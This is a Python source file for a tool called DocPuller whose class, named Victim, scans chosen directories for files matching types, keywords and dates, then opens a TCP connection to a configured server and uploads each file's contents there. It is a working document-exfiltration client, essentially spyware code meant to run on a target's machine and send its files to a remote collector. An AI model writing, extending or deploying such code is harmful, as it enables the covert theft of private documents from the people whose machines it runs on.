__author__ = 'iBen'

import socket

from DocPullerScripts.DocPullerFTP.protocol import Protocol
from DocPullerScripts.DirectoriesScaner.DocPullerGenric import DocPuller


class Victim(DocPuller, Protocol):

    def __init__(self, server, port, directorys, file_types, key_words, date):
        DocPuller.__init__(self, directorys, file_types, key_words, date)
        Protocol.__init__(self, server, port)
        self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def _pull_files(self):
        while self._running or not self._pull_files_queue.empty():
            if not self._pull_files_queue.empty():
                self._mutex.acquire()
                file_name = self._pull_files_queue.get()
                self._mutex.release()
                with open(file_name, 'rb') as f:
                    file_data = f.read()
                file_name = file_name.split('\\')[-1]
                print('sending', file_name)
                file_name = file_name.encode()
                self.send_file(self.victim, file_name, file_data)
        self._send_string(self.victim, self.DISCONNECT_MSG.encode())

    def start(self):
        try:
            self.victim.connect(self.ADDR)
            self._main()
            self.victim.close()
            print('done.')
        except Exception as e:
            print(e)

    def main(self):
        self.start()
